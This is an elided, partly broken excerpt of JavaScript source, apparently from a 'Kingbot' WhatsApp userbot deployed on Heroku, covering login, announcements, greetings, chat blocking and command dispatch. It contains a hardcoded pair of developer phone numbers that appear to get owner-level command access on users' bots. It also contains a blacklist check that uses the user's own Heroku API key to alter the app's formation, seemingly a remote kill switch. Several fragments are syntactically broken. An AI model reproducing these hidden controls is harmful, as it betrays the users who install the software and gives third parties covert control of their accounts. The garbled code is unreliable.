...
const Pach = require('Kingbot');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: Kingbot.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + Kingbot.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const KingbotDB = Kingbot.DATABASE.define('kingbotWhatsappBot', {
    info: {
...
var OWN = { ff: '94788175828,94785457519' }
...
async function Kingbot () {
    ...
    var proxyAgent_var = ''
    if (Kingbot.PROXY.includes('https') || Kingbot.PROXY.includes('http')) {
      CdKing.connectOptions.agent = ProxyAgent (Kingbot.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await Pach.news_daily(Kingbot.LANG)
        var ann = await Pach.rnn()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (Kingbot.LANG == 'EN') ilan = '| *✨Daily Announcements For Kingbot✨* |\n\n'
            if (Kingbot.LANG == 'SI') ilan = '| *✨Kingbot වට්සැප් බොට් සදහා දෛනික නිවේදන✨* |\n\n'
    ...
    asynchronous_ch()
    setInterval(async () => { 
        if (Kingbot.AUTOBIO == 'true') {
            var timezone_bio = await Pach.timezone(CdKing.user.jid)
            var date_bio = await Pach.datebio(Kingbot.LANG)
    ...
    var logger_levels = ''
    if (Kingbot.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (Kingbot.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (Kingbot.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (Kingbot.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (Kingbot.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (Kingbot.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (Kingbot.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    CdKing.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        CdKing.loadAuthInfo(Session.deCrypt(Kingbot.SESSION)); 
    } else {
...
${chalk.white.bold('Version:')} ${chalk.red.bold(Kingbot.VERSION)}
...
${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
    ...
    CdKing.on('credentials-updated', async () => {
        ...
        if (Kingbot.KingRR == ppw) {
        );
         }
         else if (Kingbot.KingRR !== ppw) {
        ...
        let Kingbotgg = Kingbot.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('👑 Kingbot is' + Kingbotgg));
        await new Promise(r => setTimeout(r, 500));
        if (CdKing.user.jid == one || CdKing.user.jid == two || CdKing.user.jid == three || CdKing.user.jid == four || CdKing.user.jid == five || CdKing.user.jid == six || CdKing.user.jid == seven || CdKing.user.jid == eight) {
            await CdKing.sendMessage(CdKing.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
            ...
            var King_start = await Pach.work_type(Kingbot.WORKTYPE, Kingbot.LANG, Kingbot.FULLKing)
            var King_img = await Pach.image_type(Kingbot.WORKTYPE, Kingbot.FULLKing)
            var rsgg = await axios.get(`${King_img}`, { responseType: 'arraybuffer' })
                await CdKing.sendMessage(conn.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                await CdKing.sendMessage(conn.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: King_start})
        await git.fetch();
        var commits = await git.log([Kingbot.BRANCH + '..origin/' + Kingbot.BRANCH]);
        if (commits.total === 0) {
            await CdKing.sendMessage(
                CdKing.user.jid,
            ...
            var up_ch = await Pach.update_(Kingbot.LANG)
            await CdKing.sendMessage(CdKing.user.jid, up_ch, MessageType.text)
        }
    })
    CdKing.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (Kingbot.NO_ONLINE) {
            await CdKing.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (Kingbot.GIFORPP == 'pp' || Kingbot.GIFORPP == 'Pp' || Kingbot.GIFORPP == 'PP' || Kingbot.GIFORPP == 'pP' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                let pp
                try { pp = await CdKing.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await CdKing.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await CdKing.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
    ...
    else if (Kingbot.GIFORPP == 'gif' || Kingbot.GIFORPP == 'Gif' || Kingbot.GIFORPP == 'GIF' || Kingbot.GIFORPP == 'GIf' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
     ...
     else if (Kingbot.GIFORPP == 'img' || Kingbot.GIFORPP == 'Img' || Kingbot.GIFORPP == 'IMG' || Kingbot.GIFORPP == 'image' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
        ...
        // ==================== Blocked Chats ====================
        if (Kingbot.BLOCKCHAT !== false) {     
            var abc = Kingbot.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.SUPPORT == '94788175828-1627812354') {     
            var sup = Kingbot.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.SUPPORT2 == '94788175828-1628835469') {     
            var tsup = Kingbot.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.SUPPORT3 == '94788175828-1628835633') {     
            var nsup = Kingbot.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRAKing == '94788175828-1621751150') {     
            var Kingrm = Kingbot.RRAKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRBKing == '94788175828-1625490851') {     
            var Kingrm = Kingbot.RRBKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRCKing == '94788175828-1618586156') {     
            var Kingrm = Kingbot.RRCKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRDKing == '94776785357-1626432386') {     
            var Kingrm = Kingbot.RRDKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RREKing == '94776785357-1626521320') {     
            var Kingrm = Kingbot.RREKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRFKing == '94788175828-1618915104') {     
            var Kingrm = Kingbot.RRFKing.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRRRA == '393475528094-1415817281') {     
            var Kingrm = Kingbot.RRRRA.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRRRB == '96176912958-1458298055') {     
            var Kingrm = Kingbot.RRRRB.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Kingbot.RRRRC == '393472769604-1446476993') {     
            var Kingrm = Kingbot.RRRRC.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Kingrm.includes(msg.key.remoteJid.split('@')[0]) : Kingrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((Kingbot.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Kingbot.SUDO.includes(',') ? Kingbot.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Kingbot.SUDO || Kingbot.SUDO.includes(',') ? Kingbot.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Kingbot.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94788175828,94785457519" && msg.key.fromMe === false && command.fromMe === true &&
                    ...
                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (Kingbot.SEND_READ && command.on === undefined) {
                        ...
                        if (msg.key.fromMe && command.deleteCommand) {
                            var wrs = CdKing.user.phone.wa_version.split('.')[2]
                        ...
                        try {
                            ...
                            if (Kingbot.NOLOG == 'true') return;
                            var error_report = await Pach.error(Kingbot.LANG)
                            await CdKing.sendMessage(CdKing.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (Kingbot.LANG == 'SI') {
                                if (error.message.includes('URL')) {
                                    return await CdKing.sendMessage(CdKing.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [Kingbot] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                ...
                                if (error.message.includes('URL')) {
                                    return await CdKing.sendMessage(CdKing.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Kingbot] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
